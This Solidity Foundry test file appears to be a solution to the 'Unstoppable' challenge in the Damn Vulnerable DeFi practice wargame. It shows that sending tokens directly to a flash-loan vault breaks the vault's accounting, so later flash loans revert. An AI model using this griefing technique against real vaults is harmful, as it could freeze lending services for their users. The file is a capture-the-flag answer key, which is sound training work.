// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;


import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {ReceiverUnstoppable} from "../src/ReceiverUnstoppable.sol";
import {UnstoppableVault} from "../src/UnstoppableVault.sol";
import { SafeTransferLib, ERC4626, ERC20 } from "solmate/src/tokens/ERC4626.sol";
import { Test, console } from "forge-std/Test.sol";


contract TestUnstoppableVault is Test {
    DamnValuableToken token;
    ReceiverUnstoppable receiverUnstoppable;
    UnstoppableVault vault;

    uint256 constant TOKENS_IN_VAULT = 1000000 ether;
    uint256 constant TOKENS_IN_VAULT_FEES = 50000 ether;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10 ether;

    address player1 = makeAddr("player");
    address player2 = makeAddr("player2");
    address feeReciepent = makeAddr("feeReceiver");
   



     function setUp() public  {
        token = new DamnValuableToken();
        vault = new UnstoppableVault(ERC20(token), msg.sender, feeReciepent);

        vm.prank(player2);
        receiverUnstoppable = new ReceiverUnstoppable(address(vault));

       //checking that contract initializes correctly
        assertEq(vault.underlyingAsset(), address(token));

        //deposit 1 million tokens
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(vault));

     }

     function test__canBreakVault() public {
        //checking the contract balances and fees
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), TOKENS_IN_VAULT_FEES);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0 ether);

        //transfer some tokens to a player1
        token.transfer(player1, INITIAL_PLAYER_TOKEN_BALANCE);
        assertEq(token.balanceOf(player1), INITIAL_PLAYER_TOKEN_BALANCE);

        //Player2 takes a flashloan (to show its possible to take a flashloan)
        vm.prank(player2);
       receiverUnstoppable.executeFlashLoan(100 ether);

        //Player1 send token to cause a DOS
        vm.prank(player1);
        token.transfer(address(vault), 2 ether);
        console.log(token.balanceOf(address(vault)));

        //Player2 tries to take a flashloan and this is expected to fail
        vm.prank(player2);
        vm.expectRevert();
        receiverUnstoppable.executeFlashLoan(100 ether);

     }

}

